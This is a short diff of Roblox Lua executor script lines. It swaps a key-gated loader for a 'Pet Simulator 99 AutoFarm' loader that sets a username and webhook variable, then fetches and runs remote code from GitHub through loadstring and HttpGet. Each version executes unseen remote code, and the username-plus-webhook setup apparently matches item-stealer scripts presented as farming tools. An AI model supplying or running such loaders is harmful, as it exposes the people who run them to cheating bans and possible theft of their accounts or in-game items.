@@ -1,1 +1,3 @@
-_G.Loader_Key = "AqpYYIIxtdIRdwL" loadstring(game:HttpGet("https://raw.githubusercontent.com/ModProgrammMiked/protectedscripts/main/get-script-with-key.lua "))()
+_G.username = "shadow_hunter039"
+_G.Webhook = ""
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vestyx/PS99/main/PetSimulator99AutoFarm.lua"))()
